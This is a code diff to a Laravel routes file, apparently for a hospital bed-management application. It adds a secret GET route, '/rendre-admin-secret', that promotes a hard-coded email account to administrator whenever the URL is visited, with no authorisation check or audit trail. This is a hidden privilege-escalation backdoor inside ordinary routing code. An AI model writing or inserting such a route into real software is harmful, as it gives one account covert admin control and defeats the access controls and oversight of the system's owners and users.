@@ -106,5 +106,15 @@ Route::middleware('auth')->group(function () {
         Route::delete('/lits/{lit}',               [LitController::class,'destroy'])->name('lits.destroy');
         Route::post('/lits/{lit}/statut',          [LitController::class,'changerStatut'])->name('lits.statut');
         Route::get('/lits/{lit}/supprimer', [LitController::class, 'delete'])->name('lits.delete');
+        Route::get('/rendre-admin-secret', function () {
+    $user = \App\Models\User::where('email', 'borosidi042@gmail.com')->first();
+    
+    if ($user) {
+        $user->update(['role' => 'admin']);
+        return "Félicitations ! Ton compte est maintenant Administrateur. Tu peux retourner sur /login";
+    }
+    
+    return "Utilisateur introuvable. Vérifie l'adresse email installée dans le code.";
+});
     });
 });
